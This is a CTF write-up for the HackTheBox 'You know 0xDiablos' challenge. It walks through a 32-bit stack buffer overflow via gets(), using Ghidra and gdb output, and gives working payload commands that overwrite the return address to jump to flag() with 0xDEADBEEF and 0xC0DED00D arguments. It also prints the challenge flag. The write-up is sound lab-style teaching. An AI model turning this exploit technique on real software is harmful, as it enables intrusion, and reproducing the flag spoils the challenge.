# You know 0xDiablos

I get used of HackTheBox process, so I expect to solve this faster.

## The challenge:

Run the file:
[./vuln](vuln)

```
You know who are 0xDiablos:
hello
hello
```

I input `hello` then receive `hello`.

Ok let hack it!

## Disassemble it

Use Ghidra to disassmble the binary:

- main():

```c
void main(void)
{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

- vuln():

```c
void vuln(void)
{
  char local_bc [180];

  gets(local_bc);
  puts(local_bc);
  return;
}

```

- flag():

```c
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Ok look like it's a basic stack overflow attack. So we have to overwrite the return address of the stack after calling `gets()` in `vuln()`.
The idea is finding the `flag()` function address then put it in the `local_bc` after the overflow of buffer size.



What are we gona do:
- Find the `flag()` address
- Write a script to embed the address to stdin


## flag() address

Use gdb tool to find:
`gdb vuln`

Run:
`info functions`

```s
Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  gets@plt
0x08049050  fgets@plt
0x08049060  getegid@plt
0x08049070  puts@plt
0x08049080  exit@plt
0x08049090  __libc_start_main@plt
0x080490a0  setvbuf@plt
0x080490b0  fopen@plt
0x080490c0  setresgid@plt
0x080490d0  _start
0x08049110  _dl_relocate_static_pie
0x08049120  __x86.get_pc_thunk.bx
0x08049130  deregister_tm_clones
0x08049170  register_tm_clones
0x080491b0  __do_global_dtors_aux
0x080491e0  frame_dummy
0x080491e2  flag    <------ HERE WE ARE
0x08049272  vuln
0x080492b1  main
0x08049330  __libc_csu_init
0x08049390  __libc_csu_fini
0x08049391  __x86.get_pc_thunk.bp
0x08049398  _fini
```

flag() address = 0x080491e2


## Stack overflow attack
http://unixwiz.net/techtips/win32-callconv-asm.html

gets():
```s
bottom of                                       top of
memory                                          memory
            local_bc       EBP        EIP
<------   [ 180 bytes ] [4 bytes] [ 4 bytes ]
top of                                          bottom of
stack                                           stack
```

We should write 184 dummy bytes then 0x080491e2 to the `local_bc`


flag(int param_1, int param_2):
```s
bottom of                                                                       top of
memory                                                                          memory
           local_10      local_50       EBP        EIP      param_1   param_2
<------  [ 4 bytes ]   [ 64 bytes ]  [4 bytes] [ 4 bytes ] [4 bytes] [4 bytes] 
top of                                                                          bottom of
stack                                                                           stack
```


```s
python3 -c "print('A'*184 + '\xe2\x91\x04\x08')" | ./vuln
```

Look like it's not correct!.

Look again at `flag()` 
`if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3))`
=> param_1 = 0xDEADBEEF
=> param_2 = 0xC0DED00D

Also need to take care the params

```s
python3 -c "print('A'*184 + '\xe2\x91\x04\x08' + '\xef\xbe\xad\xde' + '\x0d\xd0\xde\xc0')" | ./vuln
```

It didn't work!
It took me a while to figure out python2 and python3 has different result!
```s
$ python2 -c "print('A'*8 + '\xe5')" | xxd
00000000: 4141 4141 4141 4141 e50a                 AAAAAAAA..
$ python3 -c "print('A'*8 + '\xe5')" | xxd
00000000: 4141 4141 4141 4141 c3a5 0a              AAAAAAAA..
```

That's terrible! Why python3 convert `\xe5` to `c3a5` and both python put `0a` at the end!
So we need to modify the script:
```s
echo -ne \
$(python3 -c "print('A'*184, end='')")\
'\xe2\x91\x04\x08'\
'\xef\xbe\xad\xde'\
'\x0d\xd0\xde\xc0' | ./vuln
```

Look likt it does not work.
I need to do some searches and find out that we can observe the stack crash via `dmesg` on the local target file.
So somehow it takes extra 4 bytes

`echo -ne $(python3 -c "print('A'*(180+12), end='')") | ./vuln`
dmesg:
```s
[2608656.010636] vuln[163023]: segfault at 41414141 ip 0000000041414141 sp 00000000ffd210c0 error 14 in libc-2.31.so[f7d15000+19000]
```


```s
bottom of                                               top of
memory                                                  memory
            local_bc     Unknown     EBP        EIP
<------   [ 180 bytes ] [4 bytes] [4 bytes] [ 4 bytes ]
top of                                                  bottom of
stack                                                   stack
```

Then we have to modify the script to take it down: 

```s
{
echo -ne $(python3 -c "print('A'*(180), end='')")   
echo -ne 'BBBB' # unknown
echo -ne 'CCCC' # EBP
echo -ne '\xe2\x91\x04\x08'  #EIP
echo -ne 'DDDD' # Dummy
echo -ne '\xef\xbe\xad\xde' # deadbeef
echo -ne '\x0d\xd0\xde\xc0' # c0ded00d
}
```

Flag: `HTB{0ur_Buff3r_1s_not_healthy}`